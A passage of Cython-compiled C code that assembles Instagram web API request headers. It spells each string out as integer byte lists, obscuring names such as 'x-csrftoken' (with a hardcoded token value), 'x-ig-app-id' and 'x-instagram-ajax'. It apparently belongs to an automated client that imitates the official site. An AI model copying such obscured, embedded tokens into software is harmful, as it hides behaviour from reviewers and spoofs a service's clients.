  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_55);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_107);
  __Pyx_GIVEREF(__pyx_int_107);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_107);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_110);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(23); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_66);
  __Pyx_GIVEREF(__pyx_int_66);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_66);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_74);
  __Pyx_GIVEREF(__pyx_int_74);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_74);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_106);
  __Pyx_GIVEREF(__pyx_int_106);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_106);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_74);
  __Pyx_GIVEREF(__pyx_int_74);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_74);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_86);
  __Pyx_GIVEREF(__pyx_int_86);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_86);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_88);
  __Pyx_GIVEREF(__pyx_int_88);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_88);
  __Pyx_INCREF(__pyx_int_85);
  __Pyx_GIVEREF(__pyx_int_85);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_85);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_113);
  __Pyx_GIVEREF(__pyx_int_113);
  PyList_SET_ITEM(__pyx_t_2, 17, __pyx_int_113);
  __Pyx_INCREF(__pyx_int_83);
  __Pyx_GIVEREF(__pyx_int_83);
  PyList_SET_ITEM(__pyx_t_2, 18, __pyx_int_83);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 19, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_2, 20, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_76);
  __Pyx_GIVEREF(__pyx_int_76);
  PyList_SET_ITEM(__pyx_t_2, 21, __pyx_int_76);
  __Pyx_INCREF(__pyx_int_86);
  __Pyx_GIVEREF(__pyx_int_86);
  PyList_SET_ITEM(__pyx_t_2, 22, __pyx_int_86);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(11); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_100);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(16); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_56);
  __Pyx_GIVEREF(__pyx_int_56);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_56);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_52);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_52);
  __Pyx_INCREF(__pyx_int_56);
  __Pyx_GIVEREF(__pyx_int_56);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_56);
  __Pyx_INCREF(__pyx_int_55);
  __Pyx_GIVEREF(__pyx_int_55);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_55);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_56);
  __Pyx_GIVEREF(__pyx_int_56);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_56);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(14); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_109);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_48);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(16); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_106);
  __Pyx_GIVEREF(__pyx_int_106);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_106);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_120);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_48);
  __Pyx_GIVEREF(__pyx_int_48);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_48);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_53);
  __Pyx_GIVEREF(__pyx_int_53);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_53);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_56);
  __Pyx_GIVEREF(__pyx_int_56);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_56);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_50);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(16); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_113);
  __Pyx_GIVEREF(__pyx_int_113);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_113);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_104);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(14); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_88);
  __Pyx_GIVEREF(__pyx_int_88);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_88);
  __Pyx_INCREF(__pyx_int_77);
  __Pyx_GIVEREF(__pyx_int_77);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_77);
  __Pyx_INCREF(__pyx_int_76);
  __Pyx_GIVEREF(__pyx_int_76);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_76);
  __Pyx_INCREF(__pyx_int_72);
  __Pyx_GIVEREF(__pyx_int_72);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_72);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_82);
  __Pyx_GIVEREF(__pyx_int_82);
